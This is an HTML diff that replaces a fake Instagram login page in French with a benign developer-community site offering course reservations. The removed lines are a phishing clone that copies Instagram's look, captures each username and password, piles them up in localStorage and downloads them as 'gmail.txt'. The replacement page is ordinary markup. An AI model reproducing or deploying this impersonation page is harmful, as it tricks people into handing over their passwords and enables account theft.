@@ -3,135 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Connexion</title>
+    <title>Communauté de Développeurs</title>
     <style>
+        /* Global Styles */
         body {
-            font-family: Arial, sans-serif;
-            background-color: #fafafa;
             margin: 0;
-            padding: 0;
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        /* Header */
+        .header {
+            background: #222;
+            color: #fff;
+            padding: 1rem 0;
+        }
+        .header .container {
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
-            height: 100vh;
+            padding: 0 2rem;
         }
-        .container {
+        .nav-links {
+            list-style: none;
             display: flex;
-            justify-content: space-around;
-            width: 80%;
-            max-width: 900px;
+            gap: 1rem;
         }
-        .phone-preview {
-            position: relative;
+        .nav-links a {
+            color: #fff;
+            text-decoration: none;
         }
-        .phone-preview img {
-            width: 300px;
+
+        /* Hero Section */
+        .hero {
+            background: #007BFF;
+            color: #fff;
+            text-align: center;
+            padding: 2rem 1rem;
         }
-        .login-box {
-            background-color: white;
-            border: 1px solid #dbdbdb;
-            padding: 20px;
-            width: 350px;
+        .hero .btn {
+            display: inline-block;
+            margin-top: 1rem;
+            padding: 0.5rem 1rem;
+            background: #0056b3;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+
+        /* Services Section */
+        .services {
+            background: #f4f4f4;
+            padding: 2rem 1rem;
+        }
+        .services .service-items {
+            display: flex;
+            gap: 1rem;
+            justify-content: space-between;
+        }
+        .service-item {
+            background: #fff;
+            padding: 1rem;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
-        .login-box input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            box-sizing: border-box;
+
+        /* Reservation Section */
+        .reservation {
+            padding: 2rem 1rem;
         }
-        .login-box button {
-            background-color: #3897f0;
-            color: white;
+        .reservation-form {
+            max-width: 500px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        .reservation-form label {
+            font-weight: bold;
+        }
+        .reservation-form input,
+        .reservation-form select,
+        .reservation-form button {
+            padding: 0.5rem;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .reservation-form button {
+            background: #007BFF;
+            color: #fff;
             border: none;
-            padding: 10px;
-            width: 100%;
             cursor: pointer;
-            border-radius: 5px;
         }
-        .login-box button:hover {
-            background-color: #287dc2;
+        .reservation-form button:hover {
+            background: #0056b3;
         }
-        .login-box .divider {
-            display: flex;
-            align-items: center;
+
+        /* Footer */
+        .footer {
+            background: #222;
+            color: #fff;
             text-align: center;
-            margin: 10px 0;
-        }
-        .login-box .divider::before,
-        .login-box .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #dbdbdb;
-        }
-        .login-box .divider::before {
-            margin-right: .25em;
-        }
-        .login-box .divider::after {
-            margin-left: .25em;
-        }
-        .app-links img {
-            width: 130px;
-            margin: 10px 5px;
+            padding: 1rem 0;
         }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <!-- Aperçu téléphone -->
-        <div class="phone-preview">
-            <img src="https://i.imgur.com/OGwIY3T.png" alt="Phone Preview">
+    <header class="header">
+        <div class="container">
+            <h1>Communauté de Développeurs</h1>
+            <nav>
+                <ul class="nav-links">
+                    <li><a href="#services">Services</a></li>
+                    <li><a href="#reservation">Réserver un cours</a></li>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </nav>
         </div>
+    </header>
 
-        <!-- Boîte de connexion -->
-        <div class="login-box">
-            <h1>Instagram</h1>
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="Num. téléphone, nom d’utilisateur ou e-mail" required>
-                <input type="password" id="password" placeholder="Mot de passe" required>
-                <button type="submit">Se connecter</button>
-                <div class="divider">OU</div>
-                <button type="button" style="background-color:#4267B2; color:white;">Se connecter avec Facebook</button>
-                <p><a href="#">Mot de passe oublié ?</a></p>
-            </form>
-            <p>Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
-
-            <div class="app-links">
-                <p>Téléchargez l’application.</p>
-                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_FR.svg" alt="Google Play">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Badge_Store_windows_fr.png" alt="Microsoft Store">
+    <main>
+        <!-- Section d'accueil -->
+        <section class="hero">
+            <div class="container">
+                <h2>Rejoignez la communauté et améliorez vos compétences en développement.</h2>
+                <p>Apprenez des meilleurs développeurs, participez à des sessions privées, et élargissez vos horizons.</p>
+                <a href="#reservation" class="btn">Réserver un cours</a>
             </div>
+        </section>
+
+        <!-- Section Services -->
+        <section id="services" class="services">
+            <div class="container">
+                <h2>Nos Services</h2>
+                <div class="service-items">
+                    <div class="service-item">
+                        <h3>Cours de développement</h3>
+                        <p>Apprenez les bases ou perfectionnez-vous dans des langages comme Python, JavaScript, ou PHP.</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>Sessions privées</h3>
+                        <p>Réservez une session privée avec un expert pour résoudre vos problèmes spécifiques.</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>Communauté active</h3>
+                        <p>Discutez avec des développeurs passionnés et partagez vos expériences.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section Réservation -->
+        <section id="reservation" class="reservation">
+            <div class="container">
+                <h2>Réserver un cours</h2>
+                <form action="#" method="post" class="reservation-form">
+                    <label for="name">Nom :</label>
+                    <input type="text" id="name" name="name" required>
+                    
+                    <label for="email">Email :</label>
+                    <input type="email" id="email" name="email" required>
+                    
+                    <label for="course">Cours :</label>
+                    <select id="course" name="course" required>
+                        <option value="python">Python</option>
+                        <option value="javascript">JavaScript</option>
+                        <option value="php">PHP</option>
+                    </select>
+
+                    <label for="date">Date :</label>
+                    <input type="date" id="date" name="date" required>
+
+                    <button type="submit" class="btn">Réserver</button>
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2024 Communauté de Développeurs. Tous droits réservés.</p>
         </div>
-    </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();  // Empêcher l'envoi du formulaire
-
-            // Récupérer les données du formulaire
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            // Créer un contenu pour le fichier texte en ajoutant les nouvelles informations
-            const oldContent = localStorage.getItem('formContent') || '';  // Charger ancien contenu s'il existe
-            const newContent = oldContent + `Nom d'utilisateur : ${username}\nMot de passe : ${password}\n\n`;
-
-            // Stocker le contenu dans localStorage pour permettre l'accumulation des données
-            localStorage.setItem('formContent', newContent);
-
-            // Créer un objet Blob avec le contenu du fichier (incluant les anciennes données)
-            const blob = new Blob([newContent], { type: 'text/plain' });
-
-            // Créer un lien de téléchargement
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'gmail.txt';  // Nom du fichier à télécharger
-            link.click();  // Simuler un clic pour lancer le téléchargement
-        });
-    </script>
-
+    </footer>
 </body>
 </html>
